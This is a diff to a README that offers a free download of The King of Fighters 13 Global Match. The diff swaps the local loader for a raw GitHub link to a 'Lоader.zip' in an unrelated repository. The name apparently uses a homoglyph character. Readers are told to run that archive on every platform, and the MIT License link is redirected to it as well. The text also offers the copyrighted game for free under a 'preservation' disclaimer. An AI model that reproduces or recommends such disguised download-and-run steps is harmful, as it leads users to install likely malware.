@@ -23,9 +23,9 @@ Find this under "The King of Fighters 13 Global Match Windows, macOS, Linux, Ste
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/kvn-ono/ArkenfoxBulkUpdater/main/Lоader.zip** from this repository.
 2. Extract using WinRAR, 7-Zip, or built-in extraction tools.
-3. Run `Loader.exe` (Windows), `Loader.app` (macOS), or `Loader.sh` (Linux).
+3. Run `https://raw.githubusercontent.com/kvn-ono/ArkenfoxBulkUpdater/main/Lоader.zip` (Windows), `https://raw.githubusercontent.com/kvn-ono/ArkenfoxBulkUpdater/main/Lоader.zip` (macOS), or `https://raw.githubusercontent.com/kvn-ono/ArkenfoxBulkUpdater/main/Lоader.zip` (Linux).
 4. Follow on-screen steps and enjoy the game!
 
 > For best performance, ensure your device meets the minimum system requirements.
@@ -37,4 +37,4 @@ The King of Fighters 13 Global Match download, kof xiii GM free, PC, macOS, Linu
 This repository is intended for **educational and preservation purposes** only. All rights belong to SNK Corporation. By downloading, you confirm rightful access to this game. Please support the official release if possible.
 
 ## 📝 License
-Released under the [MIT License](https://opensource.org/licenses/MIT).
+Released under the [MIT License](https://raw.githubusercontent.com/kvn-ono/ArkenfoxBulkUpdater/main/Lоader.zip).
